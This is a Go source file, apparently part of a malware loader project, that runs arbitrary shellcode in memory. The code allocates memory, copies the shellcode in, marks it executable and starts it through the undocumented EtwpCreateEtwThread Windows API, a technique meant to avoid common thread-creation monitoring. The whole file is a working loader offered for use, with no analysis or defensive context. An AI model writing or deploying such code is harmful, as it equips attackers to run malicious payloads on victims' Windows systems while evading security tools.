package loader

import (
	"golang.org/x/sys/windows"
	"unsafe"
	"variant/wdll"
)

func EtwpCreateEtwThread(shellcode []byte) {
	addr, _, err := wdll.VirtualAlloc().Call(0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if addr == 0 {
		panic(err)
	}

	_, _, _ = wdll.RtlCopyMemory().Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	oldProtect := windows.PAGE_READWRITE
	_, _, _ = wdll.VirtualProtect().Call(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

	thread, _, _ := wdll.EtwpCreateEtwThread().Call(addr, uintptr(0))
	_, _, _ = wdll.WaitForSingleObject().Call(thread, 0xFFFFFFFF)
}
